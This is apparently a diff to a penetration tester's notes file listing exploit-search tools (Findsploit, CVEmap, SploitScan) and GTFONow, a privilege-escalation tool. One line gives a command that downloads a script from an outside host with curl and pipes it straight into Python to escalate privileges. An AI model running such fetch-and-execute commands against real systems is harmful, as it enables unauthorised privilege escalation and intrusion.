@@ -1,1 +1,5 @@
 https://github.com/1N3/Findsploit: is a tool use to find quickly exploit via GHDB, exploitdb,vuluers
+
+https://github.com/projectdiscovery/cvemap?ref=blog.projectdiscovery.io:  CVEmap
+https://github.com/xaitax/SploitScan
+https://github.com/Frissi0n/GTFONow.git: automatise le privesc | curl http://<IP>:<PORT>/gtfonow.py | python
